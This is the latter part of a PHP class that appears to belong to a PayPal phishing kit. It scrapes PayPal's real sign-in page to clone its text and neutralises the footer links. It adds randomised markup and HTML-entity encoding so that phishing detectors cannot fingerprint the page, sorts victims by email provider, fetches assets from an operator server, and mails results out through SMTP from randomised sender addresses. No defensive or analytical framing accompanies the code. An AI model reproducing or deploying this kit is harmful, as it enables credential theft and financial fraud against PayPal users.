    $crypt = array("A" => "065", "a" => "097", "B" => "066", "b" => "098", "C" => "067", "c" => "099", "D" => "068", "d" => "100", "E" => "069", "e" => "101", "F" => "070", "f" => "102", "G" => "071", "g" => "103", "H" => "072", "h" => "104", "I" => "073", "i" => "105", "J" => "074", "j" => "106", "K" => "075", "k" => "107", "L" => "076", "l" => "108", "M" => "077", "m" => "109", "N" => "078", "n" => "110", "O" => "079", "o" => "111", "P" => "080", "p" => "112", "Q" => "081", "q" => "113", "R" => "082", "r" => "114", "S" => "083", "s" => "115", "T" => "084", "t" => "116", "U" => "085", "u" => "117", "V" => "086", "v" => "118", "W" => "087", "w" => "119", "X" => "088", "x" => "120", "Y" => "089", "y" => "121", "Z" => "090", "z" => "122", "0" => "048", "1" => "049", "2" => "050", "3" => "051", "4" => "052", "5" => "053", "6" => "054", "7" => "055", "8" => "056", "9" => "057", "&" => "038", " " => "032", "_" => "095", "-" => "045", "@" => "064", "." => "046");
    $encode = "";
    for ($i=0; $i < strlen($str); $i++) {
      $key = substr($str, $i, 1);
      if (array_key_exists($key, $crypt)) {
        $random = rand(1, 3);
        if ($random == '1') {
          $encode = $encode.$key;
        } elseif ($random == '3') {
          $encode = $encode.$key;
        } else {
          $encode = $encode."&#".$crypt[$key].";";
        }
      } else {
        $encode = $encode.$key;
      }
    }
    return $encode;
  }
  public function undetect($html) {
    $search = array('/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s');
    $replace = array('>', '<', '\\1', '');
    $minify = preg_replace($search, $replace, $html);
    $undetect = preg_replace('/<div/', '<!-- '.$_SESSION['key'].' --><div', $minify);
    $undetect = preg_replace('/<\/div/', '<!-- '.$_SESSION['key'].' --></div', $undetect);
    $undetect = preg_replace('/class=\"/', 'class="'.microtime(1).' ', $undetect);
    if ($this->config("undetect") == "on") {
      print($undetect);
    } else {
      print($minify);
    }
  }
  public function language() {
    $file = __DIR__ . '/system/language/'.$_SESSION['lang'].'.php';
    $server_file = $this->server_api."/assets/language/paypal/".$_SESSION['lang'].".txt";
    if ($this->config("translate") == "on") {
      if (!file_exists($file)) {
        if ($this->get($server_file)['httpcode'] == 200) {
          $this->save($file, $this->get($server_file)['data'], "w");
          return $file;
        } else {
          return __DIR__ . '/system/language/en.php';
        }
      } else {
        return $file;
      }
    } else {
      return __DIR__ . '/system/language/en.php';
    }
  }
  public function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
  }
  public function signinPage() {
    $signin = $this->get("https://www.paypal.com/signin?country.x={$_SESSION['countrycode']}&locale.x={$_SESSION['lang']}_{$_SESSION['countrycode']}")['data'];
    $text['title'] = $this->getStr($signin, '<title>', '</title>');
    $text['email'] = $this->getStr($signin, '<label for="email" class="fieldLabel">', '</label>');
    $text['password'] = $this->getStr($signin, '<label for="password" class="fieldLabel">', '</label>');
    $text['forgot'] = $this->getStr($signin, 'pwrLink">','</a>');
    $text['create'] = $this->getStr($signin, 'createAccount">', '</a>');
    $text['separator'] = $this->getStr($signin, '<span class="textInSeparator">','</span>');
    $text['login'] = $this->getStr($signin, 'value="Login">', '</button>');
    $text['required'] = $this->getStr($signin, '<p class="emptyError hide">', '</p>');
    $text['captcha'] = $this->getStr($signin, 'class="hasHelp  validateEmpty   "value=""    autocomplete= "off"     placeholder=  "', '"');
    $text['notification'] = $this->getStr($signin, '<p class="notification notification-warning blocked-on-risky-login hide">', '</p>');
    $text['label-show'] = $this->getStr($signin, 'login-show-password" aria-label="', '">');
    $text['show'] = $this->getStr($signin, 'aria-label="'.$text['label-show'].'">', '</button>');
    $text['hide'] = $this->getStr($signin, 'login-hide-password" aria-label="', '">');
    $text['footer'] = $this->getStr($signin, '</section><footer class="footer" role="contentinfo">', '</div><div class="transitioning');
    preg_match_all('/href=\"(.*?)\"/', $text['footer'], $link);
    for ($i=0; $i < count($link[1]); $i++) {
      $text['footer'] = str_replace($link[1][$i], "#", $text['footer']);
    }
    return $text;
  }
  public function emailProvider() {
    if (preg_match("/@gmail|@googlemail/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'gmail';
    } elseif (preg_match("/@hotmail|@outlook|@live|@msn/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'microsoft';
    } elseif (preg_match("/@icloud|@mac|@me/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'icloud';
    } elseif (preg_match("/@yahoo|@ymail|@rocketmail/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'yahoo';
    } elseif (preg_match("/@charter|@spectrum/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'charter';
    } elseif (preg_match("/@aol/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'aol';
    } elseif (preg_match("/@yandex/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'yandex';
    } elseif (preg_match("/@gmx/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'gmx';
    } else {
      $_SESSION['provider'] = explode("@", $_SESSION['email'])[1];
    }
  }
  public function send($to, $subject, $message, $from, $img = '') {
    require __DIR__ . '/system/class/smtp.php';
    require __DIR__ . '/system/class/phpmailer.php';
    $mail = New PHPMailer;
    if ($this->config("sending") == "smtp") {
      $mail->isSMTP();
      $mail->SMTPAuth = true;
      $mail->Host = $this->config("smtp_host");
      $mail->Port = $this->config("smtp_port");
      $mail->Username = $this->config("smtp_user");
      $mail->Password = $this->config("smtp_pass");
      $mail->SMTPSecure = $this->config("smtp_secure");
    } else {
      $mail->isMail();
    }
    $mail->isHTML(true);
    $mail->CharSet = "UTF-8";
    if (!empty($img)) {
      for ($i=0; $i < count($img); $i++) {
        $mail->AddAttachment($img[$i]);
      }
    }
    $mail->setFrom(substr($this->ngerandom(), 0, 7)."@".explode("//", $this->server_api)[1], strtoupper($from));
    $mail->Subject = strtoupper($subject);
    $mail->Body = $message;
    $mail->addAddress($to);
    $mail->send();
  }
}

$api = new KuzuluyArt;
?>